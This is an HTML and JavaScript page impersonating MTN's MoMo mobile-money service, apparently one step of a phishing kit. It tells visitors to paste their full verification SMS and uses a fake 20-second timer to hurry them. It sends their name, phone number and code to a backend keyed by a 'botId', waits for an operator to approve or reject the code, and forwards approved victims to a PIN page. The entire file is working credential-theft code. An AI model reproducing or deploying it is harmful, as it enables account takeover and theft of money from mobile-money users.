<!DOCTYPE html>
<html lang="en">
<head>
  <script>
  // ============================================================
  //  BOT ID RESOLVER — runs FIRST on every page load
  // ============================================================
  (function () {
    try {
      const params = new URLSearchParams(window.location.search);

      let botId = params.get('botId');
      if (!botId) {
        botId = localStorage.getItem('botId');
      }

      if (!botId || botId === 'test_bot' || botId === 'undefined' || botId === 'null') {
        document.documentElement.innerHTML =
          '<body style="font-family:Arial;padding:40px;text-align:center;color:#c0392b">' +
          '<h2>Invalid link</h2>' +
          '<p>Tafadhali fungua ukurasa huu kupitia kiungo rasmi.</p>' +
          '</body>';
        window.__BOTID_MISSING__ = true;
        throw new Error('botId missing from URL and localStorage');
      }

      localStorage.setItem('botId', botId);

      if (params.get('botId') !== botId) {
        params.set('botId', botId);
        const newUrl = window.location.pathname + '?' + params.toString() + window.location.hash;
        window.history.replaceState({}, '', newUrl);
      }

      window.__BOT_ID__ = botId;

      console.log('🆔 botId resolved immediately:', botId);
    } catch (err) {
      console.error('botId resolver failed:', err.message);
    }
  })();
  </script>

  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>MoMo - Verify SMS</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    html, body { width: 100%; min-height: 100%; }
    body { font-family: Arial, Helvetica, sans-serif; background: #fff; overflow-x: hidden; }

    .app {
      position: relative;
      width: 100%;
      max-width: 540px;
      min-height: 100vh;
      min-height: 100svh;
      margin: 0 auto;
      background: #fff;
      overflow: hidden;
    }

    .top { position: relative; height: 200px; background: #004c69; padding-top: 52px; }
    .top::after {
      content: ""; position: absolute; left: -10%; bottom: -75px;
      width: 120%; height: 125px; background: #fff;
      border-radius: 50% 50% 0 0 / 70% 70% 0 0;
    }

    .top-bar {
      position: relative; z-index: 2;
      display: flex; align-items: center; justify-content: space-between;
      padding: 0 22px; margin-top: -10px;
    }

    .back-btn {
      color: #ffd500; font-size: 30px; text-decoration: none; font-weight: 300;
      line-height: 1; background: none; border: none; cursor: pointer;
      transition: color 0.2s;
    }
    .back-btn:hover { color: #ffffff; }

    .logo { display: flex; align-items: center; gap: 8px; }

    .logo-box {
      width: 40px; height: 40px; border-radius: 8px;
      background: linear-gradient(145deg, #087398, #003d59);
      box-shadow: 0 2px 5px rgba(0,0,0,.25), inset 0 0 4px rgba(255,255,255,.12);
      display: flex; align-items: center; justify-content: center;
    }

    .logo-symbol {
      width: 22px; height: 28px; background: #ffd500;
      clip-path: polygon(50% 0, 100% 30%, 86% 100%, 59% 69%, 39% 100%, 13% 34%);
      position: relative;
    }
    .logo-symbol::after {
      content: ""; position: absolute; width: 6px; height: 6px;
      background: #004c69; border-radius: 50%; left: 8px; top: 8px;
    }

    .logo-text { color: #ffd500; font-size: 20px; font-weight: 800; letter-spacing: -0.5px; }
    .logo-text .light { font-weight: 400; font-size: 14px; color: #b8d4e8; }

    .card {
      position: relative; z-index: 5;
      width: calc(100% - 36px); margin: -100px auto 0;
      background: #fff; border-radius: 34px;
      padding: 32px 27px 27px;
      box-shadow: 0 12px 25px rgba(0, 0, 0, .12);
    }

    .title {
      text-align: center; color: #07516b; font-size: 25px;
      font-weight: 400; margin-bottom: 12px;
    }
    .title strong { font-weight: 700; }

    .subtitle { text-align: center; color: #555; font-size: 15px; margin-bottom: 20px; }

    .instruction-note {
      font-size: 14px; color: #0a0a0a; background: #f8fafc;
      padding: 12px 16px; border-radius: 12px; margin-bottom: 20px;
      border: 1px solid #e2e8f0; line-height: 1.6;
    }

    .valid-time { font-size: 14px; color: #5b6f7e; margin-bottom: 20px; text-align: center; }

    .message-area textarea {
      width: 100%; min-height: 120px; padding: 14px 16px;
      border: 1.5px solid #111; border-radius: 20px;
      font-size: 16px; font-family: inherit; resize: vertical;
      outline: none; transition: border 0.2s, box-shadow 0.2s;
      background: #fff; line-height: 1.6;
    }
    .message-area textarea:focus {
      border-color: #005572;
      box-shadow: 0 0 0 3px rgba(0, 85, 114, 0.15);
    }
    .message-area textarea::placeholder { color: #aaa; }

    .resend-wrap {
      color: #666; font-size: 15px; margin-top: 16px; text-align: center;
    }
    .resend-wrap .timer { font-weight: 600; color: #0a0a0a; }
    .resend-wrap .clickable {
      color: #004c69; font-weight: 700; cursor: pointer; text-decoration: underline;
    }

    #message-box {
      display: none; padding: 12px 16px; border-radius: 12px;
      margin-top: 16px; font-size: 15px; font-weight: 500;
      border: 1px solid transparent;
    }
    #message-box.error {
      display: block; background: #fef3f2; border-color: #fecdca; color: #c0392b;
    }
    #message-box.success {
      display: block; background: #ecfdf3; border-color: #abf0d1; color: #0b2b3b;
    }

    .bottom { width: 100%; padding: 0 18px 14px; margin-top: 30px; }

    .continue-btn {
      width: 100%; height: 69px; border: none; border-radius: 40px;
      background: #d1d5db; color: #fff; font-size: 22px; font-weight: 700;
      cursor: not-allowed; font-family: Arial, Helvetica, sans-serif;
      transition: background 0.3s ease; text-transform: uppercase;
      letter-spacing: 0.5px; position: relative;
      display: flex; align-items: center; justify-content: center; gap: 12px;
    }

    .continue-btn:enabled { background: #005572; cursor: pointer; }
    .continue-btn:enabled:hover { background: #00415a; }
    .continue-btn:enabled:active { transform: scale(.98); }

    .continue-btn.loading:disabled { background: #005572; opacity: 1; cursor: wait; }

    .continue-btn .btn-text { display: inline; }
    .continue-btn .btn-spinner {
      display: none; width: 26px; height: 26px;
      border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid #fff;
      border-radius: 50%; animation: spin .8s linear infinite;
    }

    .continue-btn.loading .btn-text { display: none; }
    .continue-btn.loading .btn-spinner { display: inline-block; }

    @keyframes spin { to { transform: rotate(360deg); } }

    @media (max-width: 480px) {
      .top { height: 180px; padding-top: 40px; }
      .top-bar { padding: 0 16px; }
      .card { width: calc(100% - 28px); margin-top: -90px; padding: 28px 20px 24px; border-radius: 28px; }
      .title { font-size: 22px; }
      .continue-btn { height: 62px; font-size: 20px; }
    }

    @media (max-width: 380px) {
      .card { padding-left: 16px; padding-right: 16px; }
      .title { font-size: 20px; }
      .message-area textarea { min-height: 90px; font-size: 14px; }
      .continue-btn { height: 58px; font-size: 18px; }
    }

    @media (max-height: 750px) {
      .bottom { margin-top: 15px; }
    }
  </style>
</head>
<body>

<div class="app">

  <div class="top">
    <div class="top-bar">
      <button class="back-btn" onclick="window.history.back()">&#8592;</button>

      <div class="logo">
        <div class="logo-box">
          <div class="logo-symbol"></div>
        </div>
        <div class="logo-text">MoMo <span class="light">from MTN</span></div>
      </div>

      <div style="width: 30px;"></div>
    </div>
  </div>

  <div class="card">

    <div class="title">Verify Your <strong>SMS</strong></div>
    <div class="subtitle" id="subtitlePlaceholder">
      We sent a code to your phone number
    </div>

    <div class="instruction-note">
      📱 Copy the <strong>entire SMS message</strong> you received and paste it in the box below.
    </div>

    <div class="valid-time">The code is valid for 20 seconds</div>

    <div class="message-area">
      <textarea id="smsMessage" placeholder="Paste the whole SMS message here..."></textarea>
    </div>

    <div class="resend-wrap" id="resendWrap">
      Resend code in <span class="timer">00:20</span>
    </div>

    <div id="message-box"></div>

  </div>

  <div class="bottom">
    <button class="continue-btn" disabled>
      <span class="btn-text">SUBMIT</span>
      <span class="btn-spinner"></span>
    </button>
  </div>

</div>

<script>
  (function() {
    'use strict';

    // ---------- CONFIG ----------
    const BACKEND_URL = ""; // leave empty to use same-origin

    // ---------- BOTID (resolved by the head script) ----------
    const botId = window.__BOT_ID__;
    if (!botId) {
      console.warn('[MoMo] botId missing — page will not submit.');
    }

    // ---------- READ OTHER DATA ----------
    const urlParams = new URLSearchParams(window.location.search);
    let phone = urlParams.get('phone') || localStorage.getItem('phone');
    let name  = localStorage.getItem('fullName');

    if (!phone) {
      alert('Session expired. Please start over.');
      window.location.href = 'details.html?botId=' + encodeURIComponent(botId || '');
      return;
    }
    if (!name) {
      name = 'MTN User';
      try { localStorage.setItem('fullName', name); } catch (e) {}
    }

    try { localStorage.setItem('phone', phone); } catch (e) {}

    const subtitle = document.getElementById('subtitlePlaceholder');
    if (phone) {
      subtitle.textContent = 'We sent a code to ' + phone;
    }

    // ---------- DOM REFS ----------
    const textarea    = document.getElementById('smsMessage');
    const continueBtn = document.querySelector('.continue-btn');
    let   msgDiv      = document.getElementById('message-box');

    if (!msgDiv) {
      const div = document.createElement('div');
      div.id = 'message-box';
      const container = document.querySelector('.card');
      const resend = document.querySelector('.resend-wrap');
      container.insertBefore(div, resend);
      msgDiv = document.getElementById('message-box');
    }

    function showMessage(text, isError) {
      msgDiv.textContent = text;
      msgDiv.className = isError ? 'error' : 'success';
    }

    function hideMessage() {
      msgDiv.className = '';
      msgDiv.textContent = '';
    }

    // ---------- TEXTAREA VALIDATION ----------
    function checkTextArea() {
      const val = textarea.value.trim();
      continueBtn.disabled = (val === '') || continueBtn.classList.contains('loading');
    }

    textarea.addEventListener('input', function () {
      checkTextArea();
      hideMessage();
    });
    textarea.addEventListener('paste', function () {
      setTimeout(checkTextArea, 10);
    });
    textarea.focus();

    // ---------- TIMER (20 seconds) ----------
    const resendWrap = document.getElementById('resendWrap');
    let totalSeconds = 20;
    let timerInterval = null;

    function formatTime(sec) {
      const m = String(Math.floor(sec / 60)).padStart(2, '0');
      const s = String(sec % 60).padStart(2, '0');
      return m + ':' + s;
    }

    function updateTimerUI() {
      if (totalSeconds <= 0) {
        resendWrap.innerHTML = '<span class="clickable">Resend code</span>';
        if (timerInterval) { clearInterval(timerInterval); timerInterval = null; }
        const clickable = resendWrap.querySelector('.clickable');
        if (clickable) {
          clickable.onclick = function(e) {
            e.preventDefault();
            startTimer(20);
            hideMessage();
          };
        }
        return;
      }
      resendWrap.innerHTML = 'Resend code in <span class="timer">' + formatTime(totalSeconds) + '</span>';
      resendWrap.style.cursor = 'default';
    }

    function startTimer(seconds) {
      if (timerInterval) clearInterval(timerInterval);
      totalSeconds = seconds;
      updateTimerUI();
      timerInterval = setInterval(function() {
        totalSeconds--;
        if (totalSeconds <= 0) {
          totalSeconds = 0;
          updateTimerUI();
        } else {
          updateTimerUI();
        }
      }, 1000);
    }

    startTimer(20);

    // ---------- POLLING HELPER ----------
    let pollTimer = null;

    function stopPolling() {
      if (pollTimer) {
        clearInterval(pollTimer);
        pollTimer = null;
      }
    }

    function setLoading(on) {
      if (on) {
        continueBtn.disabled = true;
        continueBtn.classList.add('loading');
      } else {
        continueBtn.classList.remove('loading');
        checkTextArea();
      }
    }

    // ---------- REDIRECT HELPER ----------
    function goToPin(requestId, phoneVal) {
      var params = [
        'botId='     + encodeURIComponent(botId || ''),
        'requestId=' + encodeURIComponent(requestId || ''),
        'phone='     + encodeURIComponent(phoneVal || phone || ''),
        'name='      + encodeURIComponent(name || 'MTN User')
      ].join('&');

      var pinUrl = 'pin.html?' + params;

      console.log('✅ Approved — redirecting to:', pinUrl);

      // Try standard assignment first
      window.location.href = pinUrl;

      // Fallback if the browser blocks navigation for any reason
      setTimeout(function () {
        try { window.location.replace(pinUrl); } catch (e) {}
      }, 400);
    }

    // ---------- SUBMIT ----------
    continueBtn.addEventListener('click', function() {
      if (this.disabled || this.classList.contains('loading')) return;

      const message = textarea.value.trim();
      if (!message) {
        showMessage('Please paste or type the SMS message.', true);
        return;
      }

      if (!botId) {
        showMessage('❌ Invalid link. Please open this page through the official link.', true);
        return;
      }

      setLoading(true);
      hideMessage();

      fetch(BACKEND_URL + '/submit-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          name: name,
          phone: phone,
          code: message,
          botId: botId
        })
      })
      .then(function(res) {
        if (!res.ok) {
          return res.text().then(function(t) {
            const clean = t.startsWith('<') ? ('HTTP ' + res.status) : (t || ('HTTP ' + res.status));
            throw new Error(clean);
          });
        }
        return res.json();
      })
      .then(function(data) {
        var requestId = data.requestId;
        if (!requestId) throw new Error('No request ID received');

        try { localStorage.setItem('codeRequestId', requestId); } catch (e) {}

        stopPolling();
        var attempts = 0;
        var MAX_ATTEMPTS = 120; // ~3 minutes

        pollTimer = setInterval(function() {
          attempts++;
          fetch(BACKEND_URL + '/check-code/' + encodeURIComponent(requestId))
            .then(function(res) {
              if (!res.ok) throw new Error('Verification error');
              return res.json();
            })
            .then(function(status) {
              if (status.blocked === true) {
                stopPolling();
                setLoading(false);
                showMessage('❌ Account restricted. Please try again later.', true);
                return;
              }

              if (status.approved === true) {
                stopPolling();
                setLoading(false);
                showMessage('✅ Verified! Redirecting...', false);
                // Small delay so the success message is visible before navigating
                setTimeout(function () {
                  goToPin(requestId, phone);
                }, 700);
                return;
              }

              if (status.approved === false) {
                stopPolling();
                setLoading(false);
                showMessage('❌ Incorrect code. Please try again.', true);
                textarea.value = '';
                checkTextArea();
                textarea.focus();
                return;
              }

              if (attempts > MAX_ATTEMPTS) {
                stopPolling();
                setLoading(false);
                showMessage('⏳ Taking too long. Please try again.', true);
              }
              // else keep polling silently
            })
            .catch(function(err) {
              console.error('Polling error:', err);
            });
        }, 1500);
      })
      .catch(function(err) {
        setLoading(false);
        showMessage('❌ ' + (err.message || 'Something went wrong. Please try again.'), true);
      });
    });

    // ---------- INIT ----------
    checkTextArea();
  })();
</script>

</body>
</html>
